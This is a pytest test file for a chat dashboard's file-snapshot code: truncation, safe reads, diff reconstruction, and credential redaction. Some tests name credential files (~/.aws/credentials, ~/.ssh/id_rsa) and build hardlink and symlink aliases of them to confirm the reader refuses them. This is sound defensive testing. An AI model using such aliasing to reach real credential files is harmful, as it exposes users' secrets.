"""Tests for file-change snapshot logic in chat_runner.

Covers:
  * ``_truncate_snapshot`` — caps content at 200KB.
  * ``_safe_read_snapshot`` — reads through the descriptor gate; rejects sensitive
    paths and hardlink/symlink aliases of them.
  * ``_snapshot_write_target`` — captures before-content for write tools only.
  * ``_flush_file_changes`` — dedups, scrubs credentials, attaches to last assistant message
    or creates a synthetic one when the turn aborts before any assistant text.

These tests target the file-chips feature added. They drive
new-line coverage on chat_runner.py from ~0% to a substantial fraction without
touching the live ACP runtime — every test stays in pure-Python land.
"""

from __future__ import annotations

import ast
import inspect
import os
import shutil
import tempfile
from pathlib import Path
from types import SimpleNamespace
from unittest.mock import MagicMock, patch

import pytest
from tmpdir_helpers import SHORT_TMP_PREFIX, short_tmp_base

from conftest import requires_symlinks
from kiro_crew.dashboard.chat_runner import (
    _MAX_SNAPSHOT,
    _MAX_SNAPSHOT_PATH_CHARS,
    _MAX_TURN_SNAPSHOT_CHARS,
    _MAX_TURN_SNAPSHOT_ENTRIES,
    _apply_turn_snapshot_budget,
    _flush_file_changes,
    _record_turn_snapshot,
    _run_chat,
    _safe_read_snapshot,
    _snapshot_write_target,
    _truncate_snapshot,
    _turn_line_changes,
)
from kiro_crew.dashboard.state import _ChatSlot
from kiro_crew.security import redact


@pytest.fixture
def short_tmp_dir():
    """A short-path temp dir under ``/tmp``, removed on teardown.

    These tests assert on a file's PATH as it appears in message metadata, and a
    macOS ``tmp_path`` carries high-entropy directory ids that trip
    ``redact_credentials()`` on that field -- so the path has to come from ``/tmp``
    rather than from ``tmp_path``. ``mkdtemp`` registers no finalizer, though, so
    the nine inline calls this replaces each leaked a directory that survived the
    run; ``/tmp`` is not swept per-run the way pytest's own basetemp is.
    """
    base = Path(tempfile.mkdtemp(prefix=SHORT_TMP_PREFIX + "snap-", dir=short_tmp_base()))
    try:
        yield base
    finally:
        shutil.rmtree(base, ignore_errors=True)


# ── _truncate_snapshot ──────────────────────────────────────────────────────


class TestTruncateSnapshot:
    def test_below_cap_passes_through(self):
        assert _truncate_snapshot("hello world").content == "hello world"

    def test_empty_string_passes_through(self):
        assert _truncate_snapshot("").content == ""

    def test_exactly_at_cap_not_truncated(self):
        content = "a" * _MAX_SNAPSHOT
        assert _truncate_snapshot(content).content == content

    def test_above_cap_truncated_with_marker(self):
        content = "a" * (_MAX_SNAPSHOT + 100)
        out = _truncate_snapshot(content)
        # Original prefix preserved, marker appended.
        assert out.content.startswith("a" * _MAX_SNAPSHOT)
        assert "(truncated at" in out.content
        assert str(_MAX_SNAPSHOT) in out.content

    @pytest.mark.parametrize(
        ("length", "truncated"),
        [(_MAX_SNAPSHOT - 1, False), (_MAX_SNAPSHOT, False), (_MAX_SNAPSHOT + 1, True)],
    )
    def test_reports_truncation_at_boundary(self, length: int, truncated: bool):
        snapshot = _truncate_snapshot("é" * length)
        assert snapshot.truncated is truncated

    def test_truncation_idempotent_on_already_short_content(self):
        out = _truncate_snapshot("short")
        assert _truncate_snapshot(out.content).content == "short"


# ── _safe_read_snapshot ─────────────────────────────────────────────────────


class TestSafeReadSnapshot:
    def test_reads_normal_file(self, tmp_path: Path):
        f = tmp_path / "file.txt"
        f.write_text("hello\nworld\n")
        snapshot = _safe_read_snapshot(str(f))
        assert snapshot is not None
        assert snapshot.content == "hello\nworld\n"

    def test_reads_utf8_regardless_of_locale(self, tmp_path: Path, monkeypatch):
        # Git and agent-authored files are UTF-8 whatever the host's preferred
        # code page says; the read must not consult the locale at all.
        f = tmp_path / "unicode.txt"
        f.write_text("こんにちは", encoding="utf-8")
        import locale

        monkeypatch.setattr(locale, "getpreferredencoding", lambda *_a, **_k: "cp1252")
        snapshot = _safe_read_snapshot(str(f))
        assert snapshot is not None
        assert snapshot.content == "こんにちは"

    def test_normalizes_newlines_like_the_text_mode_read_it_replaces(self, tmp_path: Path):
        # The strReplace "before" is a text-mode read; a CRLF "after" that kept
        # its \r would diff every unchanged line as modified.
        f = tmp_path / "crlf.txt"
        f.write_bytes(b"one\r\ntwo\rthree\r\n")
        snapshot = _safe_read_snapshot(str(f))
        assert snapshot is not None
        assert snapshot.content == "one\ntwo\nthree\n"

    def test_reads_through_the_descriptor_gate_not_by_name(self, tmp_path: Path):
        # The bytes served must come from the descriptor the gate validated, so
        # a by-name re-open after validation is exactly what must NOT happen.
        f = tmp_path / "file.txt"
        f.write_text("hello\n")
        with patch.object(Path, "read_text", side_effect=AssertionError("re-opened by name")):
            snapshot = _safe_read_snapshot(str(f))
        assert snapshot is not None
        assert snapshot.content == "hello\n"

    def test_returns_none_for_missing_file(self, tmp_path: Path):
        assert _safe_read_snapshot(str(tmp_path / "ghost")) is None

    def test_returns_none_for_directory(self, tmp_path: Path):
        # validate_file_path resolves to the directory, .is_file() == False.
        assert _safe_read_snapshot(str(tmp_path)) is None

    def test_returns_none_for_empty_path(self):
        # validate_file_path returns None for empty string.
        assert _safe_read_snapshot("") is None

    def test_returns_none_for_sensitive_path(self):
        # ~/.aws is on the sensitive-path list — should never be read for snapshot.
        assert _safe_read_snapshot("~/.aws/credentials") is None
        assert _safe_read_snapshot("~/.ssh/id_rsa") is None

    def test_withholds_a_hardlink_alias_of_a_protected_file(self, tmp_path: Path, monkeypatch):
        """A hardlink alias shares its target's inode but carries its own innocent
        name: ``realpath`` yields the alias, ``is_symlink()`` is False, and every
        name-based check passes while the bytes belong to ``~/.aws/credentials``.
        ``st_nlink`` is the only signal, and only an open descriptor exposes it —
        so the read has to go through the descriptor gate, not re-open by name.
        """
        # Path.home() reads USERPROFILE on Windows and never HOME; pin both.
        monkeypatch.setenv("HOME", str(tmp_path))
        monkeypatch.setenv("USERPROFILE", str(tmp_path))
        from kiro_crew.security import is_sensitive_path

        secret = tmp_path / ".aws" / "credentials"
        secret.parent.mkdir()
        secret.write_text("aws_secret_access_key = SHOULD-NOT-APPEAR\n", encoding="utf-8")
        assert is_sensitive_path(str(secret)), "precondition: the target is protected"
        assert _safe_read_snapshot(str(secret)) is None, "precondition: the name is refused"

        alias = tmp_path / "project" / "notes.md"
        alias.parent.mkdir()
        try:
            os.link(secret, alias)
        except (OSError, NotImplementedError) as exc:  # pragma: no cover - host capability
            pytest.skip(f"filesystem does not support hardlinks: {exc}")
        if alias.stat().st_nlink < 2:  # pragma: no cover - host capability
            pytest.skip("filesystem did not create a second link")

        assert _safe_read_snapshot(str(alias)) is None

    @requires_symlinks
    def test_withholds_a_symlink_to_a_protected_file(self, tmp_path: Path, monkeypatch):
        # The link is refused at the open (``O_NOFOLLOW`` / no-reparse), before
        # any name-based resolution could launder it into an innocent path.
        # Path.home() reads USERPROFILE on Windows and never HOME; pin both.
        monkeypatch.setenv("HOME", str(tmp_path))
        monkeypatch.setenv("USERPROFILE", str(tmp_path))
        secret = tmp_path / ".aws" / "credentials"
        secret.parent.mkdir()
        secret.write_text("SHOULD-NOT-APPEAR\n", encoding="utf-8")
        link = tmp_path / "project" / "notes.md"
        link.parent.mkdir()
        link.symlink_to(secret)
        assert _safe_read_snapshot(str(link)) is None

    def test_truncates_large_file(self, tmp_path: Path):
        big = tmp_path / "big.txt"
        big.write_text("x" * (_MAX_SNAPSHOT + 50))
        out = _safe_read_snapshot(str(big))
        assert out is not None
        assert "(truncated at" in out.content
        assert out.truncated is True

    def test_truncates_a_large_multibyte_file_with_the_marker(self, tmp_path: Path):
        # Four-byte code points: the byte cap must still leave MORE than the
        # character cap, or a file just over the cap would lose its marker.
        big = tmp_path / "big.txt"
        big.write_text("\U0001f600" * (_MAX_SNAPSHOT + 1), encoding="utf-8")
        out = _safe_read_snapshot(str(big))
        assert out is not None
        assert out.content.startswith("\U0001f600" * _MAX_SNAPSHOT)
        assert "(truncated at" in out.content
        assert out.truncated is True

    def test_replaces_undecodable_bytes(self, tmp_path: Path):
        # errors="replace" is used so binary garbage doesn't crash the read.
        f = tmp_path / "binary.bin"
        f.write_bytes(b"hello\xff\xfeworld")
        out = _safe_read_snapshot(str(f))
        assert out is not None
        assert "hello" in out.content and "world" in out.content


# ── _snapshot_write_target ─────────────────────────────────────────────────


class TestSnapshotWriteTarget:
    def test_returns_none_for_non_dict_params(self):
        assert _snapshot_write_target(None) is None
        assert _snapshot_write_target("str") is None  # type: ignore[arg-type]
        assert _snapshot_write_target([]) is None  # type: ignore[arg-type]

    def test_returns_none_for_non_write_command(self, tmp_path: Path):
        f = tmp_path / "x.txt"
        f.write_text("body")
        assert _snapshot_write_target({"command": "Line", "path": str(f)}) is None
        assert _snapshot_write_target({"command": "", "path": str(f)}) is None

    def test_returns_none_for_empty_path(self):
        assert _snapshot_write_target({"command": "create", "path": ""}) is None

    @pytest.mark.parametrize(
        "path",
        [1, True, ["file.py"], {"path": "file.py"}],
        ids=["integer", "boolean", "list", "dict"],
    )
    def test_returns_none_for_non_string_path(self, path):
        assert _snapshot_write_target({"command": "create", "path": path}) is None

    @pytest.mark.parametrize(
        "cmd",
        [["npm", "test"], {"a": 1}, None, 1],
        ids=["list", "dict", "none", "integer"],
    )
    def test_returns_none_for_non_string_command(self, cmd):
        # ``command`` rides in off the wire unvalidated; a non-string value,
        # hashable or not, yields None rather than raising.
        assert _snapshot_write_target({"command": cmd, "path": "/repo/x.txt"}) is None

    def test_returns_none_for_sensitive_path(self):
        # validate_file_path rejects ~/.aws/credentials → no snapshot taken.
        assert (
            _snapshot_write_target({"command": "strReplace", "path": "~/.aws/credentials"}) is None
        )

    def test_create_on_new_file_returns_empty_content(self, tmp_path: Path):
        # File doesn't exist yet — chip should still surface with empty before.
        target = tmp_path / "new.txt"
        out = _snapshot_write_target({"command": "create", "path": str(target)})
        assert out == {"path": str(target), "content": "", "truncated": False}

    def test_str_replace_on_existing_file_captures_content(self, tmp_path: Path):
        f = tmp_path / "code.py"
        f.write_text("def hello():\n    pass\n")
        out = _snapshot_write_target({"command": "strReplace", "path": str(f)})
        assert out is not None
        assert out["path"] == str(f)
        assert out["content"] == "def hello():\n    pass\n"

    def test_insert_command_recognized_as_write(self, tmp_path: Path):
        f = tmp_path / "list.txt"
        f.write_text("a\nb\n")
        out = _snapshot_write_target({"command": "insert", "path": str(f)})
        assert out is not None
        assert out["content"] == "a\nb\n"


# ── _flush_file_changes ────────────────────────────────────────────────────


def _make_slot_with_assistant_message() -> _ChatSlot:
    """Build a _ChatSlot with one assistant message ready to receive file_changes."""
    slot = _ChatSlot("test-flush")
    slot.append("assistant", "done.", "msg msg-a", broadcast=False)
    return slot


class TestFlushFileChanges:
    def test_no_changes_is_noop(self):
        slot = _make_slot_with_assistant_message()
        _flush_file_changes(slot)
        # No meta added — message stays clean.
        assert "meta" not in slot.messages[-1] or "file_changes" not in slot.messages[-1].get(
            "meta", {}
        )

    def test_magicmock_attribute_does_not_fabricate_message(self):
        # A MagicMock-backed slot leaves _file_changes truthy but not a list.
        # Without the isinstance guard, _flush would synthesize a "stopped"
        # message every test invocation. This test pins that down.
        slot = MagicMock()
        slot.messages = []
        slot._file_changes = MagicMock()  # truthy but not a list
        _flush_file_changes(slot)
        # No synthetic message created.
        assert slot.messages == []

    def test_attaches_to_last_assistant_message(self, short_tmp_dir: Path):
        d = short_tmp_dir
        f = d / "x.py"
        f.write_text("after\n")
        slot = _make_slot_with_assistant_message()
        slot._file_changes = [{"path": str(f), "content": "before\n"}]
        _flush_file_changes(slot)
        meta = slot.messages[-1]["meta"]
        assert "file_changes" in meta
        assert len(meta["file_changes"]) == 1
        assert meta["file_changes"][0]["path"] == str(f)
        assert meta["file_changes"][0]["before"] == "before\n"
        assert meta["file_changes"][0]["after"] == "after\n"
        # Slot's accumulator is reset for the next turn.
        assert slot._file_changes == []

    @pytest.mark.parametrize(
        ("before_length", "after_length"),
        [(_MAX_SNAPSHOT + 1, 1), (1, _MAX_SNAPSHOT + 1), (_MAX_SNAPSHOT + 1, _MAX_SNAPSHOT + 2)],
    )
    def test_truncated_payload_reports_the_snapshot_limit(
        self, tmp_path: Path, before_length: int, after_length: int
    ) -> None:
        target = tmp_path / "large.txt"
        target.write_text("a" * after_length)
        captured = _snapshot_write_target(
            {"command": "create", "path": str(target)},
            diff_old_text="é" * before_length,
        )
        assert captured is not None
        slot = _make_slot_with_assistant_message()
        slot._file_changes = [captured]
        _flush_file_changes(slot)
        change = slot.messages[-1]["meta"]["file_changes"][0]
        assert change["truncated"] is True
        assert change["snapshot_limit_chars"] == _MAX_SNAPSHOT

    def test_untruncated_payload_keeps_the_legacy_shape(self, tmp_path: Path) -> None:
        target = tmp_path / "small.txt"
        target.write_text("after")
        captured = _snapshot_write_target(
            {"command": "create", "path": str(target)}, diff_old_text="before"
        )
        assert captured is not None
        slot = _make_slot_with_assistant_message()
        slot._file_changes = [captured]
        _flush_file_changes(slot)
        assert slot.messages[-1]["meta"]["file_changes"][0] == {
            "path": str(target),
            "before": "before",
            "after": "after",
        }

    def test_dedup_keeps_first_before(self, short_tmp_dir: Path):
        d = short_tmp_dir
        f = d / "loop.py"
        f.write_text("v3\n")
        slot = _make_slot_with_assistant_message()
        slot._file_changes = [
            {"path": str(f), "content": "v1\n"},
            {"path": str(f), "content": "v2\n"},
        ]
        _flush_file_changes(slot)
        changes = slot.messages[-1]["meta"]["file_changes"]
        assert len(changes) == 1
        # First "before" wins (truest pre-turn snapshot).
        assert changes[0]["before"] == "v1\n"
        # After-content is read from disk once.
        assert changes[0]["after"] == "v3\n"

    def test_dedup_across_multiple_files(self, short_tmp_dir: Path):
        d = short_tmp_dir
        a = d / "a.py"
        b = d / "b.py"
        a.write_text("a-after")
        b.write_text("b-after")
        slot = _make_slot_with_assistant_message()
        slot._file_changes = [
            {"path": str(a), "content": "a-before"},
            {"path": str(b), "content": "b-before"},
            {"path": str(a), "content": "a-mid"},  # dedup'd
        ]
        _flush_file_changes(slot)
        changes = slot.messages[-1]["meta"]["file_changes"]
        assert len(changes) == 2
        paths = {c["path"] for c in changes}
        assert paths == {str(a), str(b)}

    def test_after_empty_when_file_deleted_during_turn(self, tmp_path: Path):
        slot = _make_slot_with_assistant_message()
        # Simulate: write tool ran, captured before, then the file was removed.
        ghost = tmp_path / "ghost.txt"
        slot._file_changes = [{"path": str(ghost), "content": "had-content\n"}]
        _flush_file_changes(slot)
        changes = slot.messages[-1]["meta"]["file_changes"]
        assert changes[0]["after"] == ""
        assert changes[0]["before"] == "had-content\n"

    def test_redacts_credentials_in_after_content(self, tmp_path: Path):
        f = tmp_path / "config.ini"
        f.write_text("aws_access_key_id=AKIAIOSFODNN7EXAMPLE\n")
        slot = _make_slot_with_assistant_message()
        slot._file_changes = [{"path": str(f), "content": "(empty)"}]
        _flush_file_changes(slot)
        changes = slot.messages[-1]["meta"]["file_changes"]
        # AKIA key is scrubbed before reaching the UI.
        assert "AKIAIOSFODNN7EXAMPLE" not in changes[0]["after"]

    def test_redacts_credentials_in_before_content(self, tmp_path: Path):
        f = tmp_path / "post-edit.ini"
        f.write_text("clean\n")
        slot = _make_slot_with_assistant_message()
        slot._file_changes = [
            {"path": str(f), "content": "aws_secret_access_key=AKIAIOSFODNN7EXAMPLE\n"}
        ]
        _flush_file_changes(slot)
        changes = slot.messages[-1]["meta"]["file_changes"]
        assert "AKIAIOSFODNN7EXAMPLE" not in changes[0]["before"]

    def test_an_unchanged_credential_line_is_not_turned_into_a_phantom_diff(
        self, tmp_path: Path
    ) -> None:
        """Redaction must not decide changed-ness.

        Both sides go through the SAME pass, so a line the redactor rewrites is
        rewritten identically on both — an untouched line stays equal and the UI
        renders no diff. Redacting one side only (or twice on one side) would
        render an unchanged docs line as
        ``- Bearer <value>`` / ``+ [REDACTED: credential]``: a phantom
        modification, with the real text hidden on the very surface meant to
        review it.
        """
        f = tmp_path / "AGENTS.md"
        unchanged = '  "headers": { "Authorization": "Bearer lp_dummy_placeholder_value" }\n'
        f.write_text(unchanged, encoding="utf-8")
        slot = _make_slot_with_assistant_message()
        # Same bytes on both sides: the turn touched the file without changing
        # this line (the reported case is a docs/config example).
        slot._file_changes = [{"path": str(f), "content": unchanged}]
        _flush_file_changes(slot)
        changes = slot.messages[-1]["meta"]["file_changes"]
        assert (
            changes[0]["before"] == changes[0]["after"]
        ), "identical text redacted asymmetrically -> the UI shows a diff on an unchanged line"
        # The guard is only meaningful because the redactor DID fire here.
        assert "lp_dummy_placeholder_value" not in changes[0]["after"]

    def test_a_real_change_beside_a_credential_line_still_redacts_both_sides(
        self, tmp_path: Path
    ) -> None:
        """The symmetry guard must not be satisfiable by skipping redaction."""
        cred = '  "Authorization": "Bearer lp_dummy_placeholder_value"\n'
        f = tmp_path / "conf.json"
        f.write_text(cred + "changed-line\n", encoding="utf-8")
        slot = _make_slot_with_assistant_message()
        slot._file_changes = [{"path": str(f), "content": cred + "original-line\n"}]
        _flush_file_changes(slot)
        changes = slot.messages[-1]["meta"]["file_changes"]
        assert "lp_dummy_placeholder_value" not in changes[0]["before"]
        assert "lp_dummy_placeholder_value" not in changes[0]["after"]
        # The genuine change survives redaction on both sides.
        assert "original-line" in changes[0]["before"]
        assert "changed-line" in changes[0]["after"]

    def test_synthetic_message_created_when_no_assistant_text(self, short_tmp_dir: Path):
        """User stopped before any assistant chunk: still surface modified files."""
        d = short_tmp_dir
        f = d / "edit.py"
        f.write_text("after\n")
        slot = _ChatSlot("aborted-turn")
        # No assistant message present — only a user message.
        slot.append("user", "hi", "msg msg-u", broadcast=False)
        slot._file_changes = [{"path": str(f), "content": "before\n"}]
        _flush_file_changes(slot)
        # New synthetic message appended at the end.
        last = slot.messages[-1]
        assert last["role"] == "assistant"
        assert "stopped" in last["content"].lower()
        assert last["meta"]["file_changes"][0]["path"] == str(f)


# ── Regression tests: real event ordering & content-block paths ────────────


class TestContentBlockBeforeText:
    """Regression tests that simulate the REAL event-processing ordering.

    In production, kiro-cli auto-approves the write and executes it
    immediately via a one-way notification — by the time the dashboard
    processes the tool_call event, the file on disk already has the NEW
    content. Without the race fix, _snapshot_write_target would read the
    disk and record before == after.

    These tests write the AFTER content to disk FIRST (simulating the race),
    then call _snapshot_write_target with the authoritative diff_old_text
    from the ACP content block, and assert that `before` reflects the
    content-block value (not the racy disk read).
    """

    def test_edit_uses_diff_old_text_despite_disk_having_new_content(self, tmp_path: Path):
        """Simulate: strReplace already executed on disk, event arrives with
        diff_old_text carrying the genuine pre-edit content."""
        f = tmp_path / "app.py"
        # Disk already has the AFTER content (write landed before event processing)
        f.write_text("def hello():\n    return 'new'\n")

        # The ACP content block tells us what was there BEFORE the write
        old_content = "def hello():\n    return 'old'\n"
        result = _snapshot_write_target(
            {"command": "strReplace", "path": str(f)},
            diff_old_text=old_content,
            diff_path=str(f),
        )
        assert result is not None
        # CRITICAL: before must come from the content block, NOT the disk
        assert result["content"] == old_content
        assert result["path"] == str(f)

    def test_create_with_empty_diff_old_text_yields_empty_before(self, tmp_path: Path):
        """Simulate: create tool wrote a new file, event arrives with
        diff_old_text="" indicating file did not exist before."""
        f = tmp_path / "new_module.py"
        # Disk has the newly created content
        f.write_text("# brand new file\nclass Foo: pass\n")

        result = _snapshot_write_target(
            {"command": "create", "path": str(f)},
            diff_old_text="",  # empty string = created (no prior content)
            diff_path=str(f),
        )
        assert result is not None
        # Before must be empty for a create, regardless of what's on disk
        assert result["content"] == ""
        assert result["path"] == str(f)

    def test_create_with_none_diff_old_text_falls_back_to_disk(self, tmp_path: Path):
        """When diff_old_text is None (no content block present — e.g. the
        blocking permission-request path), fallback to disk read is correct
        because the write hasn't executed yet."""
        f = tmp_path / "existing.py"
        f.write_text("original content\n")

        result = _snapshot_write_target(
            {"command": "strReplace", "path": str(f)},
            diff_old_text=None,  # no content block → fallback
            diff_path="",
        )
        assert result is not None
        # Falls back to disk read (correct on the blocking path)
        assert result["content"] == "original content\n"

    def test_diff_path_used_when_params_path_empty(self, tmp_path: Path):
        """diff_path from the content block is used as fallback when
        raw_params has no 'path' key."""
        f = tmp_path / "target.py"
        f.write_text("after edit\n")

        result = _snapshot_write_target(
            {"command": "create", "path": ""},
            diff_old_text="before edit\n",
            diff_path=str(f),
        )
        assert result is not None
        assert result["path"] == str(f)
        assert result["content"] == "before edit\n"


class TestStrReplaceFullBeforeReconstruction:
    """The strReplace fragment-before bug (chips counting the whole file as
    additions).

    kiro-cli's diff content block ``oldText`` for strReplace is only the
    replaced FRAGMENT. The #920 race fix preferred it as the before-snapshot,
    so the chip diffed a fragment against the full-file after and rendered
    every line as an addition (observed live: a 1-line edit in a 12-line file
    showed +13 −1). The fix reconstructs the full before from the post-write
    disk content by reverse-applying the oldStr→newStr substitution.
    """

    BEFORE = "line 1\nline 2 OLD\nline 3\nline 4\n"
    AFTER = "line 1\nline 2 NEW\nline 3\nline 4\n"

    def test_post_write_reverse_substitution(self, tmp_path: Path):
        """Auto-approved path: disk already has AFTER; reconstruct BEFORE."""
        f = tmp_path / "app.py"
        f.write_text(self.AFTER)
        result = _snapshot_write_target(
            {
                "command": "strReplace",
                "path": str(f),
                "oldStr": "line 2 OLD",
                "newStr": "line 2 NEW",
            },
            diff_old_text="line 2 OLD",  # fragment, NOT the full file
            diff_path=str(f),
        )
        assert result is not None
        # Full-file before — not the one-line fragment.
        assert result["content"] == self.BEFORE

    def test_pre_write_disk_is_before(self, tmp_path: Path):
        """Blocking permission path: disk still has BEFORE; use it as-is."""
        f = tmp_path / "app.py"
        f.write_text(self.BEFORE)
        result = _snapshot_write_target(
            {
                "command": "strReplace",
                "path": str(f),
                "oldStr": "line 2 OLD",
                "newStr": "line 2 NEW",
            },
            diff_old_text="line 2 OLD",
            diff_path=str(f),
        )
        assert result is not None
        assert result["content"] == self.BEFORE

    def test_replace_all_declines_reconstruction(self, tmp_path: Path):
        """Server review finding: replaceAll doesn't enforce oldStr
        uniqueness, so reversing every newStr occurrence over-reverts any
        that pre-existed (NEW\\nOLD\\nOLD edited with replaceAll fabricated
        +3/−3 instead of +2/−2). Reconstruction declines; fragment chain
        applies."""
        f = tmp_path / "multi.txt"
        f.write_text("NEW\nmiddle\nNEW\n")
        result = _snapshot_write_target(
            {
                "command": "strReplace",
                "path": str(f),
                "oldStr": "OLD",
                "newStr": "NEW",
                "replaceAll": True,
            },
            diff_old_text="OLD",
            diff_path=str(f),
        )
        assert result is not None
        # Fell through to the fragment (diff_old_text) chain.
        assert result["content"] == "OLD"

    def test_old_str_substring_of_new_str_declines(self, tmp_path: Path):
        """Append-style edit, post-write: oldStr ⊂ newStr means the disk
        content is ALSO a valid pre-write state (oldStr occurs exactly once
        in it) — genuinely undecidable, so reconstruction declines rather
        than guessing post-write as the earlier branch order did."""
        f = tmp_path / "append.txt"
        f.write_text("head\nvalue = 1  # tuned\ntail\n")
        result = _snapshot_write_target(
            {
                "command": "strReplace",
                "path": str(f),
                "oldStr": "value = 1",
                "newStr": "value = 1  # tuned",
            },
            diff_old_text="value = 1",
            diff_path=str(f),
        )
        assert result is not None
        # Fell through to the fragment (diff_old_text) chain.
        assert result["content"] == "value = 1"

    def test_empty_new_str_deletion_falls_back_to_fragment(self, tmp_path: Path):
        """Deletion (newStr == ''): the removed text's position in the
        after-state is unrecoverable, so reconstruction declines and the
        pre-existing diff_old_text chain applies."""
        f = tmp_path / "del.txt"
        f.write_text("line 1\nline 3\n")
        result = _snapshot_write_target(
            {"command": "strReplace", "path": str(f), "oldStr": "line 2\n", "newStr": ""},
            diff_old_text="line 2\n",
            diff_path=str(f),
        )
        assert result is not None
        assert result["content"] == "line 2\n"

    def test_ambiguous_new_str_declines_reconstruction(self, tmp_path: Path):
        """Full-scope review finding: post-write content with MULTIPLE newStr
        occurrences (newStr pre-existed elsewhere) makes the edit site
        ambiguous — reversing an arbitrary occurrence attributed the edit to
        the wrong line. Reconstruction declines; fragment chain applies."""
        f = tmp_path / "ambig.txt"
        f.write_text("NEW\nNEW\n")  # true before was "NEW\nOLD\n" — unknowable
        result = _snapshot_write_target(
            {"command": "strReplace", "path": str(f), "oldStr": "OLD", "newStr": "NEW"},
            diff_old_text="OLD",
            diff_path=str(f),
        )
        assert result is not None
        # Fell through to the fragment (diff_old_text) chain.
        assert result["content"] == "OLD"

    def test_post_write_masquerading_as_pre_write_declines(self, tmp_path: Path):
        """Server review finding: strReplace("ab"→"a") on "aabb" yields "aab",
        which contains exactly one "ab" and so looks pre-write-plausible —
        but it IS the post-write state. Classifying it pre-write recorded
        the after as the before and erased the edit from the chip. With
        newStr present and non-unique, post-write cannot be excluded →
        decline."""
        f = tmp_path / "masquerade.txt"
        f.write_text("aab")  # after of strReplace("ab"→"a") on "aabb"
        result = _snapshot_write_target(
            {"command": "strReplace", "path": str(f), "oldStr": "ab", "newStr": "a"},
            diff_old_text="ab",
            diff_path=str(f),
        )
        assert result is not None
        # Fell through to the fragment (diff_old_text) chain — NOT "aab".
        assert result["content"] == "ab"

    def test_seam_reformation_declines(self, tmp_path: Path):
        """Server review finding: oldStr can re-form across the replacement
        seam (oldStr='ab', newStr='a', before='abb' → after='ab'), making
        the disk content valid as BOTH states. Dual-hypothesis
        classification declines instead of misclassifying as pre-write."""
        f = tmp_path / "seam.txt"
        f.write_text("ab")  # after-state of the seam edit; also a valid before
        result = _snapshot_write_target(
            {"command": "strReplace", "path": str(f), "oldStr": "ab", "newStr": "a"},
            diff_old_text="ab",
            diff_path=str(f),
        )
        assert result is not None
        # Fell through to the fragment (diff_old_text) chain.
        assert result["content"] == "ab"

    def test_special_file_declines(self):
        """Server review finding: /dev/zero stats as 0 bytes but reads
        unboundedly — the S_ISREG gate declines non-regular files before
        any read."""
        result = _snapshot_write_target(
            {"command": "strReplace", "path": "/dev/zero", "oldStr": "OLD", "newStr": "NEW"},
            diff_old_text="OLD",
            diff_path="/dev/zero",
        )
        assert result is not None
        assert result["content"] == "OLD"

    def test_post_read_size_recheck_declines(self, tmp_path: Path, monkeypatch):
        """The stat() gate races with an external writer growing the file;
        the post-read length re-check keeps the substring scans bounded."""
        import kiro_crew.dashboard.chat_runner as cr

        f = tmp_path / "grown.txt"
        f.write_text("NEW\n")  # passes the stat gate
        monkeypatch.setattr(
            cr, "safe_read_file", lambda _p: "x" * (cr._MAX_RECONSTRUCT_BYTES + 1) + "NEW"
        )
        result = _snapshot_write_target(
            {"command": "strReplace", "path": str(f), "oldStr": "OLD", "newStr": "NEW"},
            diff_old_text="OLD",
            diff_path=str(f),
        )
        assert result is not None
        assert result["content"] == "OLD"

    def test_missing_file_falls_back_to_fragment(self, tmp_path: Path):
        """Unreadable/missing file: reconstruction declines, diff_old_text
        chain applies (never raises)."""
        ghost = tmp_path / "ghost.txt"
        result = _snapshot_write_target(
            {"command": "strReplace", "path": str(ghost), "oldStr": "a", "newStr": "b"},
            diff_old_text="a",
            diff_path=str(ghost),
        )
        assert result is not None
        assert result["content"] == "a"

    def test_reconstructed_before_is_truncated(self, tmp_path: Path):
        """Truncation applies AFTER reconstruction so the needle can't be cut
        mid-file, but the meta-size cap still holds."""
        f = tmp_path / "huge.txt"
        f.write_text("x" * (_MAX_SNAPSHOT + 500) + "NEW")
        result = _snapshot_write_target(
            {"command": "strReplace", "path": str(f), "oldStr": "OLD", "newStr": "NEW"},
            diff_old_text="OLD",
            diff_path=str(f),
        )
        assert result is not None
        assert "(truncated at" in result["content"]
        assert len(result["content"]) < _MAX_SNAPSHOT + 500

    def test_pre_write_with_coincidental_new_str_is_before(self, tmp_path: Path):
        """Server review finding: pre-write file containing BOTH needles
        (newStr coincidentally pre-exists) must classify as before —
        reversing the unrelated newStr occurrence fabricated a changed line.
        oldStr present with oldStr ⊄ newStr PROVES pre-write (strReplace
        consumes every oldStr occurrence)."""
        f = tmp_path / "both.txt"
        f.write_text("NEW\nOLD\n")
        result = _snapshot_write_target(
            {"command": "strReplace", "path": str(f), "oldStr": "OLD", "newStr": "NEW"},
            diff_old_text="OLD",
            diff_path=str(f),
        )
        assert result is not None
        # Disk content returned unchanged — NOT "OLD\nOLD\n".
        assert result["content"] == "NEW\nOLD\n"

    def test_pre_write_append_edit_uses_disk_as_before(self, tmp_path: Path):
        """oldStr ⊂ newStr shape, write not yet landed: third branch returns
        the disk content as the before."""
        f = tmp_path / "append-pre.txt"
        f.write_text("head\nvalue = 1\ntail\n")
        result = _snapshot_write_target(
            {
                "command": "strReplace",
                "path": str(f),
                "oldStr": "value = 1",
                "newStr": "value = 1  # tuned",
            },
            diff_old_text="value = 1",
            diff_path=str(f),
        )
        assert result is not None
        assert result["content"] == "head\nvalue = 1\ntail\n"

    def test_oversized_file_declines_reconstruction(self, tmp_path: Path, monkeypatch):
        """Server review finding: the synchronous reconstruction read runs on
        the event loop — files past _MAX_RECONSTRUCT_BYTES decline and fall
        through to the fragment chain instead of stalling the loop."""
        import kiro_crew.dashboard.chat_runner as cr

        f = tmp_path / "big.txt"
        f.write_text("payload NEW payload\n")
        monkeypatch.setattr(cr, "_MAX_RECONSTRUCT_BYTES", 4)
        result = _snapshot_write_target(
            {"command": "strReplace", "path": str(f), "oldStr": "OLD", "newStr": "NEW"},
            diff_old_text="OLD",
            diff_path=str(f),
        )
        assert result is not None
        # Fell through to the fragment (diff_old_text) chain.
        assert result["content"] == "OLD"


class TestNoOpPassThrough:
    """No-op entries (before == after) are surfaced, not dropped.

    The dashboard renders an explicit "no changes" caption for them; a
    backend drop would compare post-truncation/post-redaction content and
    silently discard real changes past the snapshot limit or inside
    redacted spans.
    """

    def test_noop_write_is_surfaced(self, short_tmp_dir: Path):
        """A write with identical before/after still generates an entry
        (the frontend labels it "no changes")."""
        d = short_tmp_dir
        f = d / "unchanged.py"
        f.write_text("same content\n")
        slot = _make_slot_with_assistant_message()
        # Before content (from content block) == after content (on disk)
        slot._file_changes = [{"path": str(f), "content": "same content\n"}]
        _flush_file_changes(slot)
        meta = slot.messages[-1].get("meta", {})
        assert "file_changes" in meta
